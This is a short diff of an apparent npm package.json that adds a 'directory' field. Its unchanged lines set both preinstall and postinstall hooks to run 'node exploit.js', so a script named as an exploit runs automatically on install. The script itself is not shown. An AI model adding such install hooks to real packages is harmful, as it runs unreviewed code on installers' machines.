@@ -2,6 +2,7 @@
   "scripts": {
     "preinstall": "node exploit.js",
     "postinstall": "node exploit.js"
-  }
+  },
+  "directory": "./"
 }
 
